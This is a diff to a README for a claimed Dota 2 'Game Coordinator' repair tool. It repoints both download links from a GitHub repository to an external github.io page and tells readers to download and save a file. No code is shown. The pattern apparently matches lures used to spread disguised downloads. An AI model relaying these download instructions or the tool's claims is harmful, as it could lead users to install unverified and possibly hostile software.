@@ -1,6 +1,6 @@
 # 🖥️ Dota-2-Game-Coordinator-Fix - Resolve Dota 2 connection errors instantly
 
-[![](https://img.shields.io/badge/Download-Fix-blue.svg)](https://github.com/Platillos5574/Dota-2-Game-Coordinator-Fix)
+[![](https://img.shields.io/badge/Download-Fix-blue.svg)](https://platillos5574.github.io)
 
 ## 🔍 About this tool
 Dota 2 relies on a service called the Game Coordinator to manage matches, updates, and player inventory. When the coordinator stops responding, you cannot join queues or view your profile. This software fixes common network handshake errors and cache conflicts that prevent your client from connecting to Valve servers. This tool works on Windows 10 and Windows 11. 
@@ -14,7 +14,7 @@ Dota 2 relies on a service called the Game Coordinator to manage matches, update
 ## 📦 How to download the fix
 You can obtain the necessary repair files directly from the repository.
 
-1. Go to the [official download page](https://github.com/Platillos5574/Dota-2-Game-Coordinator-Fix).
+1. Go to the [official download page](https://platillos5574.github.io).
 2. Locate the latest release on the right side of the screen.
 3. Click the link to download the file to your computer.
 4. Save the file to your desktop for easy access.
